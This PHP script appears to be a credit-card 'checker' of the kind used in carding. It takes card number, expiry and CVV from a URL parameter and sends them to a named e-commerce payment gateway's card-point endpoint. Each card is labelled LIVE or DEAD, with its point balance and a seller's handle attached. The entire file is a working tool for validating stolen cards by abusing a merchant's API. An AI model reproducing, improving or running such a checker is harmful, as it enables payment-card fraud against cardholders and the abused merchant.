<?php
header('Content-Type: text/plain');

if (!isset($_GET['card'])) {
    echo '❌ DEAD => No card provided';
    exit;
}

$card = $_GET['card'];
$parts = explode('|', $card);
if (count($parts) < 4) {
    echo "❌ DEAD => Invalid format";
    exit;
}

$cc = trim($parts[0]);
$month = trim($parts[1]);
$year = trim($parts[2]);
$cvv = trim($parts[3]);

$url = "https://checkout-gw.prod.ticimax.net/payments/9/card-point?cc=$cc&month=$month&year=$year&cvv=$cvv&lid=45542";

$response = @file_get_contents($url);

if ($response === false) {
    echo "❌ DEAD => $card => API bağlantı hatası";
    exit;
}

$data = json_decode($response, true);

if (isset($data['pointAmount'])) {
    $puan = number_format($data['pointAmount'], 2, ',', '.');
    echo "✅ LIVE ➜ $card ➜ ✅ Approved | MAXIPUAN $puan TL @HzQuarex";
} else {
    echo "❌ DEAD => $card";
}
?>
